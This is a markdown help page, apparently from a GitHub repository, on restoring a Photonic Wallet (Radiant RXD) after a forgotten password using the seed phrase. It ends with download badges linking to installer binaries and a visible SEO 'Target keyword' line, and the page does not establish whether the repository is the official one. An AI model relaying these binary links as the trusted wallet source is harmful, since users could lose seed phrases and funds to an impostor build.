<div align="center">

<img src="https://raw.githubusercontent.com/Radiant-projects/Photonic-Wallet/HEAD/assets/photonic-wallet-radiant-rxd-banner-b-minimal-ribbon.png" alt="Photonic Wallet for Radiant (RXD) banner" width="100%">

# Forgot your Photonic Wallet password

[![Website](https://raw.githubusercontent.com/Radiant-projects/Photonic-Wallet/HEAD/assets/badge-website-photonicwallet-org.svg)](https://photonicwallet.org) [![Release](https://raw.githubusercontent.com/Radiant-projects/Photonic-Wallet/HEAD/assets/badge-release-v3-0-4.svg)](https://github.com/Radiant-projects/Photonic-Wallet/releases/tag/v3.0.4) [![Docs](https://raw.githubusercontent.com/Radiant-projects/Photonic-Wallet/HEAD/assets/badge-docs-guides.svg)](https://github.com/Radiant-projects/photonic-wallet-docs)

</div>

> **Short answer:** The local password cannot be reset, but you can restore the same wallet with your seed phrase and choose a new password.

---

## You'll see this if

- Unlock screen rejects your password
- You changed keyboards or language
- You never wrote the password down

## Why it happens

The password encrypts the wallet file on your device only; nobody holds a copy. More background lives in our guide on [move rxd out of samara wallet](move-rxd-from-samara-wallet.md) and on the [Photonic security](https://photonicwallet.org/security).

## Fix it step by step

1. Find your seed phrase backup.
2. Reinstall or open Restore in the current release.
3. Enter the phrase and pick a new password.
4. Store the new password in a password manager.

## If that didn't work

Without the seed phrase there is no recovery path; beware anyone offering password cracking. The [FAQ](https://photonicwallet.org/faq) covers related cases, and [Samara balance missing after import](samara-balance-missing-after-import.md) may match your situation.

## Prevention

Use a password manager for the local password and paper for the phrase.

> [!WARNING]
> Photonic Wallet will never ask for your seed phrase. Never type it into a website, form or chat.

## FAQ

<details>
<summary><b>Is there a reset email?</b></summary>

No. Photonic is self-custodial and has no accounts.

</details>

<details>
<summary><b>Will funds be lost?</b></summary>

Not if you have the seed phrase.

</details>

---

## Get the latest Photonic Wallet

The fix starts with the current desktop release, **[Photonic Wallet v3.0.4](https://github.com/Radiant-projects/Photonic-Wallet/releases/tag/v3.0.4)**.

<div align="center">

[![Download Photonic Wallet for Windows](https://raw.githubusercontent.com/Radiant-projects/Photonic-Wallet/HEAD/assets/badge-download-windows.svg)](https://github.com/Radiant-projects/Photonic-Wallet/releases/download/v3.0.4/photonic-wallet-v3.0.4.exe) [![Download Photonic Wallet for macOS](https://raw.githubusercontent.com/Radiant-projects/Photonic-Wallet/HEAD/assets/badge-download-macos.svg)](https://github.com/Radiant-projects/Photonic-Wallet/releases/download/v3.0.4/photonic-wallet-v3.0.4.dmg) [![Download Photonic Wallet for Linux](https://raw.githubusercontent.com/Radiant-projects/Photonic-Wallet/HEAD/assets/badge-download-linux.svg)](https://github.com/Radiant-projects/Photonic-Wallet/releases/download/v3.0.4/photonic-wallet-v3.0.4.zip)

</div>

| Platform | File | Requirements |
|---|---|---|
| **Windows** | [`photonic-wallet-v3.0.4.exe`](https://github.com/Radiant-projects/Photonic-Wallet/releases/download/v3.0.4/photonic-wallet-v3.0.4.exe) | Windows 10/11, 64-bit |
| **macOS** | [`photonic-wallet-v3.0.4.dmg`](https://github.com/Radiant-projects/Photonic-Wallet/releases/download/v3.0.4/photonic-wallet-v3.0.4.dmg) | macOS (DMG package) |
| **Linux** | [`photonic-wallet-v3.0.4.zip`](https://github.com/Radiant-projects/Photonic-Wallet/releases/download/v3.0.4/photonic-wallet-v3.0.4.zip) | x64, ZIP archive |

> [!TIP]
> Compare the SHA-256 checksum with the table on the [tagged release](https://github.com/Radiant-projects/Photonic-Wallet/releases/tag/v3.0.4) before you run the installer. Source code: [Radiant-projects/Photonic-Wallet](https://github.com/Radiant-projects/Photonic-Wallet).

## Related guides

| Guide | |
|---|---|
| [Move RXD out of Samara wallet](move-rxd-from-samara-wallet.md) | Photonic Wallet guide |
| [Samara balance missing after import](samara-balance-missing-after-import.md) | Photonic Wallet guide |
| [Migrate from Electron Radiant wallet](migrate-from-electron-radiant-wallet.md) | Photonic Wallet guide |
| [All Photonic guides](../README.md) | Docs index |

<sub>Target keyword: photonic wallet forgot password · [photonicwallet.org](https://photonicwallet.org) · [Download](https://photonicwallet.org/download)</sub>
